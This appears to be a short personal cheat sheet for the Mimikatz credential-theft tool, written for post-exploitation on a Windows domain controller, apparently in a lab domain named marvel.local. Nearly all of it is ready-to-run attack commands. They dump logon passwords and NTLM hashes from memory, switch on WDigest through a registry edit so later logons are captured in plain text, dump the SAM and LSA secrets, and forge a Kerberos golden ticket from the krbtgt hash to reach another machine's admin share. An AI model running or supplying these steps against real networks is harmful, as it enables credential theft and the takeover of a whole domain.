# Mimikatz
Can steal credentails and generate kerberos tickets, dump creds in memory etc.
https://github.com/ParrotSec/mimikatz

## Usage
This assumes you have gotten on a domain controller
```
mimikatz.exe
```
```
privilege::debug
```
### Check for passwords
```
sekurlsa::logonpasswords
```
Once you run that check the NTLM hash to see if you can pass the hash

Turn on wdigest to see if anyone logson on and we can get plain text passwords
first check
```
sekurlsa::wdigest
```
if its "null"
then run the following
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
```
Next time they login the passwords will be in plain text.

### Get the SAM/LSA
```
lsadump::sam
lsadump::sam /patch
lsadump::lsa /patch
```
### Get NTDS
```
ntds.dit
```

## Generate Golden Ticket
replace name of user
```
lsadump::lsa /inject /name:krbtgt
```
Get SID, NTLM hash as well and copy somewhere

```
kerberos::golden /User::Administrator /domain:marvel.local /sid:<sid> /krbtgt:<hash> /id:500 /ptt
```
```
misc:cmd
```
on new cmd
```
dir \\Workstation-1\c$
```
